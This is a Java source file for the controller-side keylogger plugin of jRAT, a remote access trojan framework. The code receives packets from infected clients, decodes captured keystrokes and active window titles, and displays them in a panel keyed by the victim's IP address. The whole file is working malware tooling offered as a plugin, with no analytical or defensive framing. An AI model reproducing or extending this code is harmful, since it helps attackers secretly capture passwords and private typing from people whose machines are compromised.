package pro.jrat.plugin.client;

import java.awt.event.ActionListener;
import java.io.DataInputStream;
import java.io.File;
import java.util.ArrayList;
import java.util.List;

import javax.swing.ImageIcon;

import pro.jrat.api.RATControlMenuEntry;
import pro.jrat.api.RATMenuItem;
import pro.jrat.api.RATPlugin;
import pro.jrat.api.events.OnConnectEvent;
import pro.jrat.api.events.OnDisableEvent;
import pro.jrat.api.events.OnDisconnectEvent;
import pro.jrat.api.events.OnEnableEvent;
import pro.jrat.api.events.OnPacketEvent;
import pro.jrat.api.events.OnSendPacketEvent;

public class Plugin extends RATPlugin {

	public static final String ICON_LOCATION = System.getProperty("jrat.dir") + File.separator + "plugins/Keylogger/icon.png";
	public static final byte KEY_HEADER = 121;
	public static final byte TITLE_HEADER = 122;
	public static final byte STATUS_HEADER = 123;
	
	public static RATControlMenuEntry entry;
	
	public boolean enabled;

	public void onEnable(OnEnableEvent event) throws Exception {

	}

	public void onDisable(OnDisableEvent event) throws Exception {

	}

	public void onPacket(OnPacketEvent event) throws Exception {
		DataInputStream dis = event.getServer().getDataInputStream();
		
		if (event.getPacket().getHeader() == STATUS_HEADER) {
			int len = dis.readInt();
			
			PanelKeylogger panel = (PanelKeylogger)entry.instances.get(event.getServer().getIP());
			
			for (int i = 0; i < len; i++) {
				boolean isKey = dis.readBoolean();

				if (isKey) {
					char ckey = dis.readChar();

					String key = Character.toString(ckey);

					if (ckey == '\b') {
						key = "[BACKSPACE]";
					} else if (ckey == '\n' || ckey == '\r') {
						key = "[ENTER]\n\r";
					} else if (ckey == '\t') {
						key = "[TAB]\t";
					}

					if (panel != null) {
						panel.append(key);
					}
				} else {
					String title = dis.readUTF();

					if (panel != null) {
						panel.append("[Window: " + title + "]");
					}
				}
			}
		}
	}

	public String getName() {
		return "Keylogger";
	}

	public String getVersion() {
		return "1.0";
	}

	public String getDescription() {
		return "Keylogger Plugin";
	}

	public String getAuthor() {
		return "redpois0n";
	}

	public void onConnect(OnConnectEvent event) throws Exception {

	}

	public void onDisconnect(OnDisconnectEvent event) throws Exception {

	}

	public List<RATMenuItem> getMenuItems() {
		List<RATMenuItem> list = new ArrayList<RATMenuItem>();
		RATMenuItem entry = new RATMenuItem(new MenuListener(), "Keylogger", new ImageIcon(ICON_LOCATION));
		
		list.add(entry);
		return list;
	}

	public List<RATControlMenuEntry> getControlTreeItems() throws Exception {
		List<RATControlMenuEntry> list = new ArrayList<RATControlMenuEntry>();
		entry = new RATControlMenuEntry("Keylogger", new ImageIcon(ICON_LOCATION), PanelKeylogger.class);

		list.add(entry);
		return list;
	}

	public void onSendPacket(OnSendPacketEvent event) throws Exception {
		
	}

	@Override
	public ActionListener getGlobalMenuItemListener() {
		return null;
	}

}
